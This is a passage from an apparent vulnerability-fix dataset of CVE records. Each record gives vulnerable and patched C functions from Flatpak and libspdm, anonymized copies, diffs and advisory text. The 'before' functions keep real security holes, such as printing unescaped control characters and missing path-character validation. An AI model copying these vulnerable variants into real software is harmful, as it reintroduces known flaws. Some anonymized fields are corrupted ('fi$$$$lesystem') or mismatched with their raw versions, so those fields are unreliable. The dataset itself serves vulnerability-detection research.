Co-authored-by: Simon McVittie <smcv@collabora.com>",7fe63f2e8f1fd2dafc31d45154cf0b191ebec66c,https://github.com/flatpak/flatpak/commit/7fe63f2e8f1fd2dafc31d45154cf0b191ebec66c,common/flatpak-context.c,flatpak_context_parse_filesystem,"gboolean
flatpak_context_parse_filesystem (const char             *filesystem_and_mode,
gboolean                negated,
char                  **filesystem_out,
FlatpakFilesystemMode  *mode_out,
GError                **error)
{
g_autofree char *filesystem = NULL;
char *slash;
filesystem = parse_filesystem_flags (filesystem_and_mode, negated, mode_out, error);
if (filesystem == NULL)
return FALSE;
slash = strchr (filesystem, '/');
if (slash != NULL)
{
if (g_str_has_prefix (slash + 1, ""../"") ||
g_str_has_suffix (slash + 1, ""/.."") ||
strstr (slash + 1, ""/../"") != NULL)
{
g_set_error (error, G_OPTION_ERROR, G_OPTION_ERROR_BAD_VALUE,
_(""Filesystem location \""%s\"" contains \""..\""""),
filesystem);
return FALSE;
}
while (TRUE)
{
slash = strrchr (filesystem, '/');
if (slash != NULL &&
((slash != filesystem && slash[1] == '\0') ||
(slash[1] == '.' && slash[2] == '\0')))
*slash = '\0';
else
break;
}
if (filesystem[0] == '/' && filesystem[1] == '\0')
{
g_set_error (error, G_OPTION_ERROR, G_OPTION_ERROR_BAD_VALUE,
_(""--filesystem=/ is not available, ""
""use --filesystem=host for a similar result""));
return FALSE;
}
}
if (g_strv_contains (flatpak_context_special_filesystems, filesystem) ||
get_xdg_user_dir_from_string (filesystem, NULL, NULL, NULL) ||
g_str_has_prefix (filesystem, ""~/"") ||
g_str_has_prefix (filesystem, ""/""))
{
if (filesystem_out != NULL)
*filesystem_out = g_steal_pointer (&filesystem);
return TRUE;
}
if (strcmp (filesystem, ""~"") == 0)
{
if (filesystem_out != NULL)
*filesystem_out = g_strdup (""home"");
return TRUE;
}
if (g_str_has_prefix (filesystem, ""home/""))
{
if (filesystem_out != NULL)
*filesystem_out = g_strconcat (""~/"", filesystem + 5, NULL);
return TRUE;
}
g_set_error (error, G_OPTION_ERROR, G_OPTION_ERROR_FAILED,
_(""Unknown filesystem location %s, valid locations are: host, host-os, host-etc, home, xdg-*[/], ~/dir, /dir""), filesystem);
return FALSE;
}","gboolean
flatpak_context_parse_filesystem (const char             *VAR_0,
gboolean                VAR_1,
char                  **VAR_2,
FlatpakFilesystemMode  *VAR_3,
GError                **VAR_4)
{
g_autofree char *VAR_5 = NULL;
char *VAR_6;
VAR_5 = parse_filesystem_flags (VAR_0, VAR_1, VAR_3, VAR_4);
if (VAR_5 == NULL)
return FALSE;
VAR_6 = strchr (VAR_5, '/');
if (VAR_6 != NULL)
{
if (g_str_has_prefix (VAR_6 + 1, ""../"") ||
g_str_has_suffix (VAR_6 + 1, ""/.."") ||
strstr (VAR_6 + 1, ""/../"") != NULL)
{
g_set_error (VAR_4, VAR_7, VAR_8,
_(""Filesystem location \""%s\"" contains \""..\""""),
VAR_5);
return FALSE;
}
for (; VAR_6 != NULL; VAR_6 = strchr (VAR_6 + 1, '/'))
{
while (TRUE)
{
if (VAR_6[1] == '/')
memmove (VAR_6 + 1, VAR_6 + 2, strlen (VAR_6 + 2) + 1);
else if (VAR_6[1] == '.' && VAR_6[2] == '/')
memmove (VAR_6 + 1, VAR_6 + 3, strlen (VAR_6 + 3) + 1);
else
break;
}
}
while (TRUE)
{
VAR_6 = strrchr (VAR_5, '/');
if (VAR_6 != NULL &&
((VAR_6 != VAR_5 && VAR_6[1] == '\0') ||
(VAR_6[1] == '.' && VAR_6[2] == '\0')))
*VAR_6 = '\0';
else
break;
}
if (VAR_5[0] == '/' && VAR_5[1] == '\0')
{
g_set_error (VAR_4, VAR_7, VAR_8,
_(""--filesystem=/ is not available, ""
""use --filesystem=host for a similar result""));
return FALSE;
}
}
if (g_strv_contains (VAR_9, VAR_5) ||
get_xdg_user_dir_from_string (VAR_5, NULL, NULL, NULL) ||
g_str_has_prefix (VAR_5, ""~/"") ||
g_str_has_prefix (VAR_5, ""/""))
{
if (VAR_2 != NULL)
*VAR_2 = g_steal_pointer (&VAR_5);
return TRUE;
}
if (strcmp (VAR_5, ""~"") == 0)
{
if (VAR_2 != NULL)
*VAR_2 = g_strdup (""home"");
return TRUE;
}
if (g_str_has_prefix (VAR_5, ""home/""))
{
if (VAR_2 != NULL)
*VAR_2 = g_strconcat (""~/"", VAR_5 + 5, NULL);
return TRUE;
}
g_set_error (VAR_4, VAR_7, VAR_10,
_(""Unknown filesystem location %s, valid locations are: host, host-os, host-etc, home, xdg-*[/], ~/dir, /dir""), fi$$$$lesystem);$$$$
return FALSE;
}",flatpak/7fe63f2e8f1fd2dafc31d45154cf0b191ebec66c/flatpak-context.c/vul/before/3.json,"gboolean
flatpak_context_parse_filesystem (const char             *filesystem_and_mode,
                                  gboolean                negated,
                                  char                  **filesystem_out,
                                  FlatpakFilesystemMode  *mode_out,
                                  GError                **error)
{
  g_autofree char *filesystem = NULL;
  char *slash;

  if (!flatpak_validate_path_characters (filesystem_and_mode, error))
    return FALSE;

  filesystem = parse_filesystem_flags (filesystem_and_mode, negated, mode_out, error);
  if (filesystem == NULL)
    return FALSE;

  slash = strchr (filesystem, '/');

  /* Forbid /../ in paths */
  if (slash != NULL)
    {
      if (g_str_has_prefix (slash + 1, ""../"") ||
          g_str_has_suffix (slash + 1, ""/.."") ||
          strstr (slash + 1, ""/../"") != NULL)
        {
          g_set_error (error, G_OPTION_ERROR, G_OPTION_ERROR_BAD_VALUE,
                       _(""Filesystem location \""%s\"" contains \""..\""""),
                       filesystem);
          return FALSE;
        }

      /* Convert ""//"" and ""/./"" to ""/"" */
      for (; slash != NULL; slash = strchr (slash + 1, '/'))
        {
          while (TRUE)
            {
              if (slash[1] == '/')
                memmove (slash + 1, slash + 2, strlen (slash + 2) + 1);
              else if (slash[1] == '.' && slash[2] == '/')
                memmove (slash + 1, slash + 3, strlen (slash + 3) + 1);
              else
                break;
            }
        }

      /* Eliminate trailing ""/."" or ""/"". */
      while (TRUE)
        {
          slash = strrchr (filesystem, '/');

          if (slash != NULL &&
              ((slash != filesystem && slash[1] == '\0') ||
               (slash[1] == '.' && slash[2] == '\0')))
            *slash = '\0';
          else
            break;
        }

      if (filesystem[0] == '/' && filesystem[1] == '\0')
        {
          /* We don't allow --filesystem=/ as equivalent to host, because
           * it doesn't do what you'd think: --filesystem=host mounts some
           * host directories in /run/host, not in the root. */
          g_set_error (error, G_OPTION_ERROR, G_OPTION_ERROR_BAD_VALUE,
                       _(""--filesystem=/ is not available, ""
                         ""use --filesystem=host for a similar result""));
          return FALSE;
        }
    }

  if (g_strv_contains (flatpak_context_special_filesystems, filesystem) ||
      get_xdg_user_dir_from_string (filesystem, NULL, NULL, NULL) ||
      g_str_has_prefix (filesystem, ""~/"") ||
      g_str_has_prefix (filesystem, ""/""))
    {
      if (filesystem_out != NULL)
        *filesystem_out = g_steal_pointer (&filesystem);

      return TRUE;
    }

  if (strcmp (filesystem, ""~"") == 0)
    {
      if (filesystem_out != NULL)
        *filesystem_out = g_strdup (""home"");

      return TRUE;
    }

  if (g_str_has_prefix (filesystem, ""home/""))
    {
      if (filesystem_out != NULL)
        *filesystem_out = g_strconcat (""~/"", filesystem + 5, NULL);

      return TRUE;
    }

  g_set_error (error, G_OPTION_ERROR, G_OPTION_ERROR_FAILED,
               _(""Unknown filesystem location %s, valid locations are: host, host-os, host-etc, home, xdg-*[/], ~/dir, /dir""), filesystem);
  return FALSE;
}","gboolean
flatpak_context_parse_filesystem (const char             *VAR_0,
                                  gboolean                VAR_1,
                                  char                  **VAR_2,
                                  FlatpakFilesystemMode  *VAR_3,
                                  GError                **VAR_4)
{
  g_autofree char *VAR_5 = NULL;
  char *VAR_6;

  if (!flatpak_validate_path_characters (VAR_0, VAR_4))
    return FALSE;

  VAR_5 = parse_filesystem_flags (VAR_0, VAR_1, VAR_3, VAR_4);
  if (VAR_5 == NULL)
    return FALSE;

  VAR_6 = strchr (VAR_5, '/');

  /* COMMENT_0 */
  if (VAR_6 != NULL)
    {
      if (g_str_has_prefix (VAR_6 + 1, ""../"") ||
          g_str_has_suffix (VAR_6 + 1, ""/.."") ||
          strstr (VAR_6 + 1, ""/../"") != NULL)
        {
          g_set_error (VAR_4, VAR_7, VAR_8,
                       _(""Filesystem location \""%s\"" contains \""..\""""),
                       VAR_5);
          return FALSE;
        }

      /* COMMENT_1 */
      for (; VAR_6 != NULL; VAR_6 = strchr (VAR_6 + 1, '/'))
        {
          while (TRUE)
            {
              if (VAR_6[1] == '/')
                memmove (VAR_6 + 1, VAR_6 + 2, strlen (VAR_6 + 2) + 1);
              else if (VAR_6[1] == '.' && VAR_6[2] == '/')
                memmove (VAR_6 + 1, VAR_6 + 3, strlen (VAR_6 + 3) + 1);
              else
                break;
            }
        }

      /* COMMENT_2 */
      while (TRUE)
        {
          VAR_6 = strrchr (VAR_5, '/');

          if (VAR_6 != NULL &&
              ((VAR_6 != VAR_5 && VAR_6[1] == '\0') ||
               (VAR_6[1] == '.' && VAR_6[2] == '\0')))
            *VAR_6 = '\0';
          else
            break;
        }

      if (VAR_5[0] == '/' && VAR_5[1] == '\0')
        {
          /* COMMENT_3 */
                                                                          
                                                               
          g_set_error (VAR_4, VAR_7, VAR_8,
                       _(""--filesystem=/ is not available, ""
                         ""use --filesystem=host for a similar result""));
          return FALSE;
        }
    }

  if (g_strv_contains (VAR_9, VAR_5) ||
      get_xdg_user_dir_from_string (VAR_5, NULL, NULL, NULL) ||
      g_str_has_prefix (VAR_5, ""~/"") ||
      g_str_has_prefix (VAR_5, ""/""))
    {
      if (VAR_2 != NULL)
        *VAR_2 = g_steal_pointer (&VAR_5);

      return TRUE;
    }

  if (strcmp (VAR_5, ""~"") == 0)
    {
      if (VAR_2 != NULL)
        *VAR_2 = g_strdup (""home"");

      return TRUE;
    }

  if (g_str_has_prefix (VAR_5, ""home/""))
    {
      if (VAR_2 != NULL)
        *VAR_2 = g_strconcat (""~/"", VAR_5 + 5, NULL);

      return TRUE;
    }

  g_set_error (VAR_4, VAR_7, VAR_10,
               _(""Unknown filesystem location %s, valid locations are: host, host-os, host-etc, home, xdg-*[/], ~/dir, /dir""), fi$$$$lesystem);$$$$
  return FALSE;
}",flatpak/7fe63f2e8f1fd2dafc31d45154cf0b191ebec66c/flatpak-context.c/vul/after/3.json,"--- func_before
+++ func_after
@@ -7,6 +7,9 @@
 {
   g_autofree char *filesystem = NULL;
   char *slash;
+
+  if (!flatpak_validate_path_characters (filesystem_and_mode, error))
+    return FALSE;
 
   filesystem = parse_filesystem_flags (filesystem_and_mode, negated, mode_out, error);
   if (filesystem == NULL)","{'deleted_lines': [], 'added_lines': ['', '  if (!flatpak_validate_path_characters (filesystem_and_mode, error))', '    return FALSE;']}",True,"Flatpak is a system for building, distributing, and running sandboxed desktop applications on Linux. In versions prior to 1.10.8, 1.12.8, 1.14.4, and 1.15.4, if an attacker publishes a Flatpak app with elevated permissions, they can hide those permissions from users of the `flatpak(1)` command-line interface by setting other permissions to crafted values that contain non-printable control characters such as `ESC`. A fix is available in versions 1.10.8, 1.12.8, 1.14.4, and 1.15.4. As a workaround, use a GUI like GNOME Software rather than the command-line interface, or only install apps whose maintainers you trust.",5.0,MEDIUM,1,valid,2023-03-05T03:07:03Z,4
CVE-2023-28101,['CWE-116'],CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N,1,flatpak,"cli-transaction: Escape any special characters in the EOL reason

CVE-2023-28101, GHSA-h43h-fwqx-mpp8

Signed-off-by: Simon McVittie <smcv@collabora.com>",409e34187de2b2b2c4ef34c79f417be698830f6c,https://github.com/flatpak/flatpak/commit/409e34187de2b2b2c4ef34c79f417be698830f6c,app/flatpak-cli-transaction.c,print_eol_info_message,"static void
print_eol_info_message (FlatpakDir        *dir,
FlatpakDecomposed *ref,
const char        *ref_name,
const char        *rebased_to_ref,
const char        *reason)
{
gboolean is_pinned = flatpak_dir_ref_is_pinned (dir, flatpak_decomposed_get_ref (ref));
g_autofree char *ref_branch = flatpak_decomposed_dup_branch (ref);
const char *on = """";
const char *off = """";
if (flatpak_fancy_output ())
{
on = FLATPAK_ANSI_BOLD_ON;
off = FLATPAK_ANSI_BOLD_OFF;
}
if (rebased_to_ref)
{
g_autoptr(FlatpakDecomposed) eolr_decomposed = NULL;
g_autofree char *eolr_name = NULL;
const char *eolr_branch;
eolr_decomposed = flatpak_decomposed_new_from_ref (rebased_to_ref, NULL);
g_assert (eolr_decomposed != NULL);
g_assert (flatpak_decomposed_get_kind (ref) == flatpak_decomposed_get_kind (eolr_decomposed));
eolr_name = flatpak_decomposed_dup_id (eolr_decomposed);
eolr_branch = flatpak_decomposed_get_branch (eolr_decomposed);
if (is_pinned)
{
g_print (_(""\nInfo: (pinned) runtime %s%s%s branch %s%s%s is end-of-life, in favor of %s%s%s branch %s%s%s\n""),
on, ref_name, off, on, ref_branch, off, on, eolr_name, off, on, eolr_branch, off);
}
else
{
if (flatpak_decomposed_is_runtime (ref))
g_print (_(""\nInfo: runtime %s%s%s branch %s%s%s is end-of-life, in favor of %s%s%s branch %s%s%s\n""),
on, ref_name, off, on, ref_branch, off, on, eolr_name, off, on, eolr_branch, off);
else
g_print (_(""\nInfo: app %s%s%s branch %s%s%s is end-of-life, in favor of %s%s%s branch %s%s%s\n""),
on, ref_name, off, on, ref_branch, off, on, eolr_name, off, on, eolr_branch, off);
}
}
else if (reason)
{
if (is_pinned)
{
g_print (_(""\nInfo: (pinned) runtime %s%s%s branch %s%s%s is end-of-life, with reason:\n""),
on, ref_name, off, on, ref_branch, off);
}
else
{
if (flatpak_decomposed_is_runtime (ref))
g_print (_(""\nInfo: runtime %s%s%s branch %s%s%s is end-of-life, with reason:\n""),
on, ref_name, off, on, ref_branch, off);
else
g_print (_(""\nInfo: app %s%s%s branch %s%s%s is end-of-life, with reason:\n""),
on, ref_name, off, on, ref_branch, off);
}
g_print (""   %s\n"", reason);
}
}","static void
print_eol_info_message (FlatpakDir        *VAR_0,
FlatpakDecomposed *VAR_1,
const char        *VAR_2,
const char        *VAR_3,
const char        *VAR_4)
{
gboolean VAR_5 = flatpak_dir_ref_is_pinned (VAR_0, flatpak_decomposed_get_ref (VAR_1));
g_autofree char *VAR_6 = flatpak_decomposed_dup_branch (VAR_1);
const char *VAR_7 = """";
const char *VAR_8 = """";
if (flatpak_fancy_output ())
{
VAR_7 = VAR_9;
VAR_8 = VAR_10;
}
if (VAR_3)
{
VAR_11(FlatpakDecomposed) VAR_12 = NULL;
g_autofree char *VAR_13 = NULL;
const char *VAR_14;
VAR_12 = flatpak_decomposed_new_from_ref (VAR_3, NULL);
g_assert (VAR_12 != NULL);
g_assert (flatpak_decomposed_get_kind (VAR_1) == flatpak_decomposed_get_kind (VAR_12));
VAR_13 = flatpak_decomposed_dup_id (VAR_12);
VAR_14 = flatpak_decomposed_get_branch (VAR_12);
if (VAR_5)
{
g_print (_(""\nInfo: (pinned) runtime %s%s%s branch %s%s%s is end-of-life, in favor of %s%s%s branch %s%s%s\n""),
VAR_7, VAR_2, VAR_8, VAR_7, VAR_6, VAR_8, VAR_7, VAR_13, VAR_8, VAR_7, VAR_14, VAR_8);
}
else
{
if (flatpak_decomposed_is_runtime (VAR_1))
g_print (_(""\nInfo: runtime %s%s%s branch %s%s%s is end-of-life, in favor of %s%s%s branch %s%s%s\n""),
VAR_7, VAR_2, VAR_8, VAR_7, VAR_6, VAR_8, VAR_7, VAR_13, VAR_8, VAR_7, VAR_14, VAR_8);
else
g_print (_(""\nInfo: app %s%s%s branch %s%s%s is end-of-life, in favor of %s%s%s branch %s%s%s\n""),
VAR_7, VAR_2, VAR_8, VAR_7, VAR_6, VAR_8, VAR_7, VAR_13, VAR_8, VAR_7, VAR_14, VAR_8);
}
}
else if (VAR_4)
{
if (VAR_5)
{
g_print (_(""\nInfo: (pinned) runtime %s%s%s branch %s%s%s is end-of-life, with reason:\n""),
VAR_7, VAR_2, VAR_8, VAR_7, VAR_6, VAR_8);
}
else
{
if (flatpak_decomposed_is_runtime (VAR_1))
g_print (_(""\nInfo: runtime %s%s%s branch %s%s%s is end-of-life, with reason:\n""),
VAR_7, VAR_2, VAR_8, VAR_7, VAR_6, VAR_8);
else
g_print (_(""\nInfo: app %s%s%s branch %s%s%s is end-of-life, with reason:\n""),
VAR_7, VAR_2, VAR_8, VAR_7, VAR_6, VAR_8);
}
g_print (""   %s\n"", VAR_4);
}
}",flatpak/409e34187de2b2b2c4ef34c79f417be698830f6c/flatpak-cli-transaction.c/vul/before/0.json,"static void
print_eol_info_message (FlatpakDir        *dir,
                        FlatpakDecomposed *ref,
                        const char        *ref_name,
                        const char        *rebased_to_ref,
                        const char        *reason)
{
  gboolean is_pinned = flatpak_dir_ref_is_pinned (dir, flatpak_decomposed_get_ref (ref));
  g_autofree char *ref_branch = flatpak_decomposed_dup_branch (ref);
  const char *on = """";
  const char *off = """";

  if (flatpak_fancy_output ())
    {
      on = FLATPAK_ANSI_BOLD_ON;
      off = FLATPAK_ANSI_BOLD_OFF;
    }

  /* Here we go to great lengths not to split the sentences. See
   * https://wiki.gnome.org/TranslationProject/DevGuidelines/Never%20split%20sentences
   */
  if (rebased_to_ref)
    {
      g_autoptr(FlatpakDecomposed) eolr_decomposed = NULL;
      g_autofree char *eolr_name = NULL;
      const char *eolr_branch;

      eolr_decomposed = flatpak_decomposed_new_from_ref (rebased_to_ref, NULL);

      /* These are guarantees from FlatpakTransaction */
      g_assert (eolr_decomposed != NULL);
      g_assert (flatpak_decomposed_get_kind (ref) == flatpak_decomposed_get_kind (eolr_decomposed));

      eolr_name = flatpak_decomposed_dup_id (eolr_decomposed);
      eolr_branch = flatpak_decomposed_get_branch (eolr_decomposed);

      if (is_pinned)
        {
          /* Only runtimes can be pinned */
          g_print (_(""\nInfo: (pinned) runtime %s%s%s branch %s%s%s is end-of-life, in favor of %s%s%s branch %s%s%s\n""),
                   on, ref_name, off, on, ref_branch, off, on, eolr_name, off, on, eolr_branch, off);
        }
      else
        {
          if (flatpak_decomposed_is_runtime (ref))
            g_print (_(""\nInfo: runtime %s%s%s branch %s%s%s is end-of-life, in favor of %s%s%s branch %s%s%s\n""),
                     on, ref_name, off, on, ref_branch, off, on, eolr_name, off, on, eolr_branch, off);
          else
            g_print (_(""\nInfo: app %s%s%s branch %s%s%s is end-of-life, in favor of %s%s%s branch %s%s%s\n""),
                     on, ref_name, off, on, ref_branch, off, on, eolr_name, off, on, eolr_branch, off);
        }
    }
  else if (reason)
    {
      g_autofree char *escaped_reason = flatpak_escape_string (reason,
                                                               FLATPAK_ESCAPE_ALLOW_NEWLINES |
                                                               FLATPAK_ESCAPE_DO_NOT_QUOTE);
      if (is_pinned)
        {
          /* Only runtimes can be pinned */
          g_print (_(""\nInfo: (pinned) runtime %s%s%s branch %s%s%s is end-of-life, with reason:\n""),
                   on, ref_name, off, on, ref_branch, off);
        }
      else
        {
          if (flatpak_decomposed_is_runtime (ref))
            g_print (_(""\nInfo: runtime %s%s%s branch %s%s%s is end-of-life, with reason:\n""),
                     on, ref_name, off, on, ref_branch, off);
          else
            g_print (_(""\nInfo: app %s%s%s branch %s%s%s is end-of-life, with reason:\n""),
                     on, ref_name, off, on, ref_branch, off);
        }
      g_print (""   %s\n"", escaped_reason);
    }
}","static void
print_eol_info_message (FlatpakDir        *VAR_0,
                        FlatpakDecomposed *VAR_1,
                        const char        *VAR_2,
                        const char        *VAR_3,
                        const char        *VAR_4)
{
  gboolean VAR_5 = flatpak_dir_ref_is_pinned (VAR_0, flatpak_decomposed_get_ref (VAR_1));
  g_autofree char *VAR_6 = flatpak_decomposed_dup_branch (VAR_1);
  const char *VAR_7 = """";
  const char *VAR_8 = """";

  if (flatpak_fancy_output ())
    {
      VAR_7 = VAR_9;
      VAR_8 = VAR_10;
    }

  /* COMMENT_0 */
                                                                                      
     
  if (VAR_3)
    {
      VAR_11(FlatpakDecomposed) VAR_12 = NULL;
      g_autofree char *VAR_13 = NULL;
      const char *VAR_14;

      VAR_12 = flatpak_decomposed_new_from_ref (VAR_3, NULL);

      /* COMMENT_3 */
      g_assert (VAR_12 != NULL);
      g_assert (flatpak_decomposed_get_kind (VAR_1) == flatpak_decomposed_get_kind (VAR_12));

      VAR_13 = flatpak_decomposed_dup_id (VAR_12);
      VAR_14 = flatpak_decomposed_get_branch (VAR_12);

      if (VAR_5)
        {
          /* COMMENT_4 */
          g_print (_(""\nInfo: (pinned) runtime %s%s%s branch %s%s%s is end-of-life, in favor of %s%s%s branch %s%s%s\n""),
                   VAR_7, VAR_2, VAR_8, VAR_7, VAR_6, VAR_8, VAR_7, VAR_13, VAR_8, VAR_7, VAR_14, VAR_8);
        }
      else
        {
          if (flatpak_decomposed_is_runtime (VAR_1))
            g_print (_(""\nInfo: runtime %s%s%s branch %s%s%s is end-of-life, in favor of %s%s%s branch %s%s%s\n""),
                     VAR_7, VAR_2, VAR_8, VAR_7, VAR_6, VAR_8, VAR_7, VAR_13, VAR_8, VAR_7, VAR_14, VAR_8);
          else
            g_print (_(""\nInfo: app %s%s%s branch %s%s%s is end-of-life, in favor of %s%s%s branch %s%s%s\n""),
                     VAR_7, VAR_2, VAR_8, VAR_7, VAR_6, VAR_8, VAR_7, VAR_13, VAR_8, VAR_7, VAR_14, VAR_8);
        }
    }
  else if (VAR_4)
    {
      g_autofree char *VAR_15 = flatpak_escape_string (VAR_4,
                                                               VAR_16 |
                                                               VAR_17);
      if (VAR_5)
        {
          /* COMMENT_4 */
          g_print (_(""\nInfo: (pinned) runtime %s%s%s branch %s%s%s is end-of-life, with reason:\n""),
                   VAR_7, VAR_2, VAR_8, VAR_7, VAR_6, VAR_8);
        }
      else
        {
          if (flatpak_decomposed_is_runtime (VAR_1))
            g_print (_(""\nInfo: runtime %s%s%s branch %s%s%s is end-of-life, with reason:\n""),
                     VAR_7, VAR_2, VAR_8, VAR_7, VAR_6, VAR_8);
          else
            g_print (_(""\nInfo: app %s%s%s branch %s%s%s is end-of-life, with reason:\n""),
                     VAR_7, VAR_2, VAR_8, VAR_7, VAR_6, VAR_8);
        }
      g_print (""   %s\n"", VAR_15);
    }
}",flatpak/409e34187de2b2b2c4ef34c79f417be698830f6c/flatpak-cli-transaction.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -52,6 +52,9 @@
     }
   else if (reason)
     {
+      g_autofree char *escaped_reason = flatpak_escape_string (reason,
+                                                               FLATPAK_ESCAPE_ALLOW_NEWLINES |
+                                                               FLATPAK_ESCAPE_DO_NOT_QUOTE);
       if (is_pinned)
         {
           /* Only runtimes can be pinned */
@@ -67,6 +70,6 @@
             g_print (_(""\nInfo: app %s%s%s branch %s%s%s is end-of-life, with reason:\n""),
                      on, ref_name, off, on, ref_branch, off);
         }
-      g_print (""   %s\n"", reason);
+      g_print (""   %s\n"", escaped_reason);
     }
 }","{'deleted_lines': ['      g_print (""   %s\\n"", reason);'], 'added_lines': ['      g_autofree char *escaped_reason = flatpak_escape_string (reason,', '                                                               FLATPAK_ESCAPE_ALLOW_NEWLINES |', '                                                               FLATPAK_ESCAPE_DO_NOT_QUOTE);', '      g_print (""   %s\\n"", escaped_reason);']}",True,"Flatpak is a system for building, distributing, and running sandboxed desktop applications on Linux. In versions prior to 1.10.8, 1.12.8, 1.14.4, and 1.15.4, if an attacker publishes a Flatpak app with elevated permissions, they can hide those permissions from users of the `flatpak(1)` command-line interface by setting other permissions to crafted values that contain non-printable control characters such as `ESC`. A fix is available in versions 1.10.8, 1.12.8, 1.14.4, and 1.15.4. As a workaround, use a GUI like GNOME Software rather than the command-line interface, or only install apps whose maintainers you trust.",5.0,MEDIUM,1,valid,2023-03-15T10:51:16Z,4
CVE-2023-31127,['CWE-287'],CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H,1,DMTF/libspdm,"Add handshake mode switch check in FINISH and PSK_FINISH.

Reference: DMTF-2023-0001

Fix: https://github.com/DMTF/libspdm/issues/2005

Signed-off-by: Jiewen Yao <jiewen.yao@intel.com>",8426a309c1de246ac13012246e44b6249a43d081,https://github.com/DMTF/libspdm/commit/8426a309c1de246ac13012246e44b6249a43d081,library/spdm_responder_lib/libspdm_rsp_finish.c,libspdm_get_response_finish,"libspdm_return_t libspdm_get_response_finish(void *context, size_t request_size,
const void *request,
size_t *response_size,
void *response)
{
uint32_t session_id;
bool result;
uint32_t hmac_size;
uint32_t signature_size;
uint8_t req_slot_id;
const spdm_finish_request_t *spdm_request;
spdm_finish_response_t *spdm_response;
libspdm_context_t *spdm_context;
libspdm_session_info_t *session_info;
uint8_t th2_hash_data[LIBSPDM_MAX_HASH_SIZE];
libspdm_return_t status;
libspdm_session_state_t session_state;
spdm_context = context;
spdm_request = request;
if (spdm_request->header.spdm_version != libspdm_get_connection_version(spdm_context)) {
return libspdm_generate_error_response(spdm_context,
SPDM_ERROR_CODE_VERSION_MISMATCH, 0,
response_size, response);
}
if (spdm_context->response_state != LIBSPDM_RESPONSE_STATE_NORMAL) {
return libspdm_responder_handle_response_state(
spdm_context,
spdm_request->header.request_response_code,
response_size, response);
}
if (!libspdm_is_capabilities_flag_supported(
spdm_context, false,
SPDM_GET_CAPABILITIES_REQUEST_FLAGS_KEY_EX_CAP,
SPDM_GET_CAPABILITIES_RESPONSE_FLAGS_KEY_EX_CAP)) {
return libspdm_generate_error_response(
spdm_context, SPDM_ERROR_CODE_UNSUPPORTED_REQUEST,
SPDM_KEY_EXCHANGE, response_size, response);
}
if (spdm_context->connection_info.connection_state < LIBSPDM_CONNECTION_STATE_NEGOTIATED) {
return libspdm_generate_error_response(spdm_context,
SPDM_ERROR_CODE_UNEXPECTED_REQUEST,
0, response_size, response);
}
if (!libspdm_is_capabilities_flag_supported(
spdm_context, false,
SPDM_GET_CAPABILITIES_REQUEST_FLAGS_HANDSHAKE_IN_THE_CLEAR_CAP,
SPDM_GET_CAPABILITIES_RESPONSE_FLAGS_HANDSHAKE_IN_THE_CLEAR_CAP)) {
if (!spdm_context->last_spdm_request_session_id_valid) {
return libspdm_generate_error_response(
context, SPDM_ERROR_CODE_SESSION_REQUIRED, 0, response_size, response);
}
} else {
if (spdm_context->last_spdm_request_session_id_valid) {
return libspdm_generate_error_response(
context, SPDM_ERROR_CODE_SESSION_REQUIRED, 0,
response_size, response);
}
}
if (spdm_context->last_spdm_request_session_id_valid) {
session_id = spdm_context->last_spdm_request_session_id;
} else {
session_id = spdm_context->latest_session_id;
}
session_info = libspdm_get_session_info_via_session_id(spdm_context, session_id);
if (session_info == NULL) {
return libspdm_generate_error_response(spdm_context,
SPDM_ERROR_CODE_SESSION_REQUIRED, 0,
response_size, response);
}
session_state = libspdm_secured_message_get_session_state(
session_info->secured_message_context);
if (session_state != LIBSPDM_SESSION_STATE_HANDSHAKING) {
return libspdm_generate_error_response(spdm_context,
SPDM_ERROR_CODE_UNEXPECTED_REQUEST, 0,
response_size, response);
}
if (((session_info->mut_auth_requested == 0) &&
(spdm_request->header.param1 != 0)) ||
((session_info->mut_auth_requested != 0) &&
(spdm_request->header.param1 == 0))) {
return libspdm_generate_error_response(spdm_context,
SPDM_ERROR_CODE_INVALID_REQUEST, 0,
response_size, response);
}
hmac_size = libspdm_get_hash_size(spdm_context->connection_info.algorithm.base_hash_algo);
signature_size = 0;
#if LIBSPDM_ENABLE_CAPABILITY_MUT_AUTH_CAP
if (session_info->mut_auth_requested) {
signature_size = libspdm_get_req_asym_signature_size(
spdm_context->connection_info.algorithm.req_base_asym_alg);
}
#endif
if (request_size !=
sizeof(spdm_finish_request_t) + signature_size + hmac_size) {
return libspdm_generate_error_response(spdm_context,
SPDM_ERROR_CODE_INVALID_REQUEST, 0,
response_size, response);
}
req_slot_id = spdm_request->header.param2;
if ((req_slot_id != 0xFF) &&
(req_slot_id >= SPDM_MAX_SLOT_COUNT)) {
return libspdm_generate_error_response(spdm_context,
SPDM_ERROR_CODE_INVALID_REQUEST, 0,
response_size, response);
}
if (req_slot_id == 0xFF) {
req_slot_id = spdm_context->encap_context.req_slot_id;
}
if (req_slot_id != spdm_context->encap_context.req_slot_id) {
return libspdm_generate_error_response(spdm_context,
SPDM_ERROR_CODE_INVALID_REQUEST, 0,
response_size, response);
}
libspdm_reset_message_buffer_via_request_code(spdm_context, session_info,
spdm_request->header.request_response_code);
status = libspdm_append_message_f(spdm_context, session_info, false, request,
sizeof(spdm_finish_request_t));
if (LIBSPDM_STATUS_IS_ERROR(status)) {
return libspdm_generate_error_response(spdm_context,
SPDM_ERROR_CODE_UNSPECIFIED, 0,
response_size, response);
}
#if LIBSPDM_ENABLE_CAPABILITY_MUT_AUTH_CAP
if (session_info->mut_auth_requested) {
result = libspdm_verify_finish_req_signature(
spdm_context, session_info,
(const uint8_t *)request + sizeof(spdm_finish_request_t), signature_size);
if (!result) {
if((spdm_context->handle_error_return_policy &
LIBSPDM_DATA_HANDLE_ERROR_RETURN_POLICY_DROP_ON_DECRYPT_ERROR) == 0) {
return libspdm_generate_error_response(
spdm_context, SPDM_ERROR_CODE_DECRYPT_ERROR, 0,
response_size, response);
} else {
*response_size = 0;
return LIBSPDM_STATUS_UNSUPPORTED_CAP;
}
}
status = libspdm_append_message_f(
spdm_context, session_info, false,
(const uint8_t *)request + sizeof(spdm_finish_request_t),
signature_size);
if (LIBSPDM_STATUS_IS_ERROR(status)) {
return libspdm_generate_error_response(
spdm_context, SPDM_ERROR_CODE_UNSPECIFIED,
0, response_size, response);
}
}
#endif
result = libspdm_verify_finish_req_hmac(
spdm_context, session_info, (const uint8_t *)request + signature_size +
sizeof(spdm_finish_request_t), hmac_size);
if (!result) {
if((spdm_context->handle_error_return_policy &
